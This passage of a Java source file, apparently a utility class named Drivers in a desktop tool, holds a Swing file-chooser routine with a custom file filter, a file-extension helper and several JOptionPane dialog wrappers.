			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		            	String extension = "";
		            	
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	if(fle == null)
		            		return false;
		            	
		            	if(fle != null && fle.exists() && Drivers.getFileExtension(fle, false)!= null)
		            		extension = (Drivers.getFileExtension(fle, false)).replace(".", "");//remove the "." if present
		            	
		            	/*if(Driver.lstAcceptableFileExtensionsForStego.contains(extension.toLowerCase()))
		            		return true;*/
		            	
		            	//else 
		            		return false;
		              }
		   
		              public String getDescription() 
		              {
		                return "Specific Formats";
		              }
		              
		         });
			}
			
			
			try
			{
				jfc.setCurrentDirectory(new File(".\\"));
			}catch(Exception e){}
			
			int selection = 0;
			
			if(openDialog)					
			{
				selection = jfc.showOpenDialog(null);
			}
			
			else
			{
				//selection = jfc.showDialog(null, "Save Now!"); <-- this code works too
				selection = jfc.showSaveDialog(null);
			}
					
			if(selection == JFileChooser.APPROVE_OPTION)//selected yes!
			{
				if(openDialog || (!openDialog && !thisLoadsCSV))
					return jfc.getSelectedFile();
				
				else
					return new File(jfc.getSelectedFile().getAbsolutePath() + ".csv");
			}
			
			//else fall through and return null;
		}
		
		catch(Exception e)
		{
			
			Drivers.eop("querySelectFile", "Drivers", e, "", false);
			
		}
		
		return null;
	}
	
	
	public static String getFileExtension(File fle, boolean removeDot_Preceeding_Extension)
	{
		try
		{
			if(fle != null)
			{
				if(removeDot_Preceeding_Extension)
					return (fle.toString().substring(fle.toString().lastIndexOf(".") + 1));
					
				//some files do not have extensions, in such cases, SNSCat may seem to be crashing. therefore check if the file contains a "." at the end, if not, return what we have
				if(!fle.toString().contains(".") || fle.toString().lastIndexOf(".") < 0 )
				{
					try
					{
						return (fle.toString().substring(fle.toString().lastIndexOf(System.getProperty("file.separator"))));
					}
					catch(Exception e)
					{
						return " ";
					}
				}
				
				return (fle.toString().substring(fle.toString().lastIndexOf(".")));
			}
			
		}
		catch(NullPointerException npe)
		{
			Drivers.sop("NullPointerException caught in getFileExtension_ByteArray mtd in Drivers.  This seems to be a sporadic error, called when user first attempts to view the files in a directory. This does not affect funtionality of program.  Dismissing error...");
		}
		catch(Exception e)
		{
			Drivers.eop("getFileExtension", "Drivers", e, "", false);
			
		}
		
		return null;
	}
	
	public static void jop_Error(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.ERROR_MESSAGE);
	}
	
	public static void jop_Warning(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.WARNING_MESSAGE);
	}
	
	public static void jop_Message(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.INFORMATION_MESSAGE);
	}
	
	public static void jop(String strMsg)
	{
		JOptionPane.showMessageDialog(null, strMsg, "Unable to continue selected action...", JOptionPane.INFORMATION_MESSAGE);
	}
	public static void jop_Message(String strMsg)
	{
		JOptionPane.showMessageDialog(null, strMsg, "Message", JOptionPane.INFORMATION_MESSAGE);
	}
	
	public static String jop_Query(String strMsg, String strTitle)
	{
		Object o = strMsg;
		
		return JOptionPane.showInputDialog(null, o, strTitle, JOptionPane.QUESTION_MESSAGE);
	}
}
